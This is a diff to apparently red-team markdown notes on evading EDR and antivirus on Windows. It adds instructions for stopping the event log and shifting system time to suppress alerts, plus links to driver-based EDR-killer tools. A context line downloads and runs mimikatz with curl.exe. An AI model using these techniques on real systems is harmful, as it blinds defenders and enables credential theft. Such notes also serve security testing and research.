@@ -54,6 +54,8 @@ curl.exe -o v:\mimi.exe https://.../mimikatz.exe
 v:\mimi.exe
 ~~~
 
+You can disable system event log as local admin by opening `perfmon.exe`, selecting *Data Collector Sets/Event Trace Sessions/EventLog-System*, right click and hit *Stop* ([source](https://twitter.com/0gtweet/status/1755849963605561419)).
+
 Untested tools:
 
 - [TimeException](https://github.com/bananabr/TimeException), detect excluded folders trough timing discrepancies
@@ -61,6 +63,7 @@ Untested tools:
 
 References:
 
+- [Event Log Manipulations - Time slipping](http://web.archive.org/web/20240118072246/https://scribe.rip/@mthcht/event-log-manipulations-1-time-slipping-55bf95631c40), as local admin change system time into future, some EDRs and SIEMs won't generate alerts anymore
 - [Red Teaming in the EDR age - Wild West Hackin' Fest 2018](https://www.youtube.com/watch?v=l8nkXCOYQC4)
 - [docs.google.com/spreadsheets/u/0/d/1ZMFrD6F6tvPtf_8McC-kWrNBBec_6Si3NW6AoWf3Kbg/htmlview](https://docs.google.com/spreadsheets/u/0/d/1ZMFrD6F6tvPtf_8McC-kWrNBBec_6Si3NW6AoWf3Kbg/htmlview), telemetry sources of common EDRs
 - [twitter.com/Cyb3rMonk/status/1648743976407531525](https://twitter.com/Cyb3rMonk/status/1648743976407531525), EDRs cant log every event due to shear volume
@@ -109,6 +112,8 @@ This works against some AVs and maybe even against some EDRs.
 
 Untested tools:
 
+- [EventLogCrasher](https://github.com/floesen/EventLogCrasher), crash event log service remotely over [[notes/network/msrpc]]
+- [devcon.exe](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/devcon-disable) can disable kernel drivers somehow?
 - [KDU](https://github.com/hfiref0x/KDU), exploit various vulnerable drivers to hijack protected processes or load unsigned drivers
 - [OffensivePH](https://github.com/RedSection/OffensivePH), uses old Process Hacker driver to inject shellcode into PPL processes
 - [TokenUniverse](https://github.com/diversenok/TokenUniverse), GUI to tamper with Windows tokens and many other objects
@@ -134,7 +139,7 @@ Evade EDRs by loading a signed but dangerous dangerous driver to tamper with ker
 
 Tested tools:
 
-- [EDRSandblast-GodFault](https://github.com/gabriellandau/EDRSandblast-GodFault), removes kernel hooks without a kernel driver trough [GodFault](https://github.com/gabriellandau/PPLFault#godfault) ([source](http://web.archive.org/web/20230901211135/https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need))
+- [EDRSandblast-GodFault](https://github.com/gabriellandau/EDRSandblast-GodFault), removes kernel hooks without a kernel driver trough [GodFault](https://github.com/gabriellandau/PPLFault#godfault) ([source](http://web.archive.org/web/20230901211135/https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need)), patched since February 2024 ([source](https://twitter.com/GabrielLandau/status/1757818200127946922))
 - [EDRSandblast](https://github.com/wavestone-cdt/edrsandblast/tree/defcon30release), uses `RTCore64.sys` or `DBUtils_2_3.sys`, pain to setup, but works well
 - [CheekyBlinder](https://github.com/br-sn/cheekyblinder), less features then EDRSandblast
 
@@ -153,12 +158,15 @@ References:
 
 Tested tools:
 
+- [TrueSightKiller](https://github.com/MaorSabag/TrueSightKiller), in C++, uses `truesight.sys`, not blocked by HVCI
 - [Terminator](https://github.com/ZeroMemoryEx/Terminator), uses `zam64.sys` to kill processes
 - [Backstab](https://github.com/yaxser/backstab), uses Process Explorer driver, worked only partially
 - [Breakcyserver](https://github.com/waawaa/breakcyserver), uses Process Explorer driver, didn't work
 
 Untested tools:
 
+- [s4killer](https://github.com/enkomio/s4killer), in Rust, uses `probmon.sys`
+- [rusty_drivers](https://github.com/dxxzero/rusty_drivers), in Rust, supports drivers from Process Explorer, Genshin Impact, `rentdrv2.sys` and `truesight.sys`
 - [GhostDriver](https://github.com/BlackSnufkin/GhostDriver), in Rust, uses `rentdrv.sys`
 - [LOLDrivers Finder](https://github.com/xalicex/LOLDrivers_finder/blob/main/finder.py), search LolDrivers for drivers that can kill processes
 - [mhydeath](https://github.com/zer0condition/mhydeath), uses `mhyprotect.sys`
